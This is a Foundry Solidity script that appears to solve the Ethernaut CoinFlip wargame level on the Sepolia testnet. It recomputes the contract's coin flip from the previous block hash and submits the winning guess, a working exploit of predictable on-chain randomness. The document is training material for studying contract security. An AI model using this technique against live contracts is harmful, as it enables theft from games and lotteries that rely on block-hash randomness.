// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "src/CoinFlip.sol";
import {DevOpsTools} from "lib/foundry-devops/src/DevOpsTools.sol";

contract AttackCoinFlip is Script {
    CoinFlip private s_coinFlip;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public constant SEPOLIA_ETH_CHAIN_ID = 11155111;
    address public constant ETHERNAUT_INSTANCE = 0x037f8181A3c3741358138eD4d96ADB8D1C0bc83F;

    function run() public {
        if (block.chainid == SEPOLIA_ETH_CHAIN_ID) {
            attackCoinFlip(ETHERNAUT_INSTANCE);
        } else {
            address mostRecentlyDeployed = DevOpsTools.get_most_recent_deployment("CoinFlip", block.chainid);
            attackCoinFlip(mostRecentlyDeployed);
        }
    }

    function attackCoinFlip(address _coinFlip) public {
        s_coinFlip = CoinFlip(_coinFlip);
        console.log("Attacking CoinFlip");
        console.log("Initial wins: ", s_coinFlip.consecutiveWins());

        vm.startBroadcast();
        bool guess = _guessFlipCoinOutcome();
        bool result = s_coinFlip.flip(guess);
        vm.stopBroadcast();

        console.log("Result: ", result);
        console.log("Consecutive wins: ", s_coinFlip.consecutiveWins());
        console.log("End of attack");
    }

    function _guessFlipCoinOutcome() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("Guessing coin flip outcome with block hash: ", blockValue);

        uint256 coinFlip = blockValue / FACTOR;
        console.log("Guessed outcome: ", coinFlip);
        return coinFlip == 1 ? true : false;
    }
}
